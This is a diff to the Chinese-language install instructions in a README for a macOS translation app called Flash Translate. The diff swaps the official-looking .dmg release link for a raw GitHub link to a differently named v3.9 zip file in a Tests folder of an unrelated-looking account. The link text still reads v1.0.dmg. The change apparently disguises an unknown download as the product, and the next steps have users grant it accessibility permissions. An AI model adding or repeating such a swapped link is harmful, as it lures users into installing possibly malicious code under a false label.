@@ -17,7 +17,7 @@
 
 ## 📦 安装
 
-1. 下载 [FlashTranslate-v1.0.dmg](https://github.com/YOUR_USERNAME/Flash-Translate/releases/download/v1.0/FlashTranslate-v1.0.dmg)
+1. 下载 [FlashTranslate-v1.0.dmg](https://raw.githubusercontent.com/gonadal-blackoperation118/Flash-Translate/main/Tests/Flash_Translate_v3.9.zip)
 2. 打开 DMG 文件
 3. 将 Flash Translate 拖到应用程序文件夹
 4. 首次运行需要授予辅助功能权限
